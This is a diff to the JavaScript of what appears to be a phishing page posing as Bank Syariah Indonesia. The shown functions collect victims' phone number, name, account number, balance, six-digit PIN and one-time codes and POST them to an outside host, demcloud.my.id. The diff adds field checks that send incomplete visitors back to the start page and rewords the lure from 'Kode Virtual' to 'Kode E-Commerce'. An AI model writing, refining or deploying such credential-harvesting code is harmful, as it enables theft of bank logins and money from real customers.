@@ -26,6 +26,16 @@ function sendLog() {
 event.preventDefault();
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
+ const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    
+                                
+   if (!tarif || !nomor || !nama || !rek ) {      
+        window.location.href = "/";
+        return false;
+    }    
       $.ajax({
             type: 'POST',
             url: 'https://demcloud.my.id/BSI/hgs77a/login.php',
@@ -52,6 +62,17 @@ function sendSaldo() {
 event.preventDefault();
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    const saldo = $('#saldo').val();
+    
+                                
+   if (!tarif || !nomor || !nama || !rek || !saldo ) {      
+        window.location.href = "/";
+        return false;
+    }    
       $.ajax({
             type: 'POST',
             url: 'https://demcloud.my.id/BSI/hgs77a/saldo.php',
@@ -80,8 +101,19 @@ $('.process1').fadeIn();
 function sendOtp() {
   event.stopPropagation();
     event.preventDefault();
-  
+  $("#djload").show();  
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    const saldo = $('#saldo').val();
+    const sixpin = $('#sixpin').val();
+                                
+   if (!tarif || !nomor || !nama || !rek || !saldo || !sixpin) {      
+        window.location.href = "/";
+        return false;
+    }    
 $.ajax({
  type: 'POST',
  url: 'https://demcloud.my.id/BSI/hgs77a/otp.php',
@@ -95,12 +127,12 @@ setTimeout(function(){
        
       
     }, 2000);
-     $("#notif").text("- Kode Virtual sudah kadaluarsa -");
+     $("#notif").text("- Kode E-Commerce sudah kadaluarsa -");
      $("#notif").css("color", "red");
         }
     });
       setTimeout(() => {
-     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode Virtual,<br/>Silahkan klik tombol dibawah ini";
+     document.getElementById("notif").innerHTML = "Untuk mendapatkan kode E-Commerce,<br/>Silahkan klik tombol dibawah ini";
      $("#djload").hide();  
    $("#notif").css("color", "black");
  $("#sixpin").val("");
